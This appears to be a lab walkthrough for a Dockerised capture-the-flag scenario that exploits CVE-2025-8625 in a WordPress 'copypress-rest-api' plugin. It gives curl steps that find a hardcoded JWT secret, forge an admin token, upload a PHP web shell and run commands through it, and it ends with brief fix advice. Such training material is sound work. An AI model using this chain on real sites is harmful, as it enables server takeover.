# WEB-05: WordPress Copypress JWT RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-05 |
| 名称 | WordPress Copypress JWT RCE |
| 技术/CVE | CVE-2025-8625 |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10105 |

## 场景概述
- 技术：CVE-2025-8625
- 难度：L2
- 交付方式：docker
- 入口端口：10105
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-8625 (CVSS 9.8) |
| Difficulty | L2 |
| Port | 10105 |
| Plugin | copypress-rest-api 1.2 |

### Attack Path
```
Discover hardcoded JWT secret → Forge admin JWT → Upload malicious plugin via REST API → RCE → /flag.txt
```

### Step-by-Step

```bash
# Step 1: Discover hardcoded JWT secret (in plugin source)
curl http://localhost:10105/wp-content/plugins/copypress-rest-api/copypress.php | grep -i secret

# Step 2: Forge JWT token with admin role
# Use jwt.io or Python PyJWT with discovered secret

# Step 3: Upload PHP shell via REST API
curl -X POST http://localhost:10105/wp-json/copypress/v1/upload \
  -H "Authorization: Bearer <forged_admin_jwt>" \
  -F "file=@shell.php"

# Read flag
curl http://localhost:10105/wp-content/uploads/copypress/shell.php?cmd=cat+/flag.txt
# flag{web-05-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | WordPress REST/AJAX API and JSON Web Tokens |
| 侦察与前置条件 | Identify Copypress token validation and privileged upload/action endpoints |
| 核心漏洞与利用 | Forge or misuse the vulnerable JWT to reach the privileged action |
| 权限、横向或影响 | WordPress-side command or file execution |
| 验证 | Use the authenticated exploit result to retrieve the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
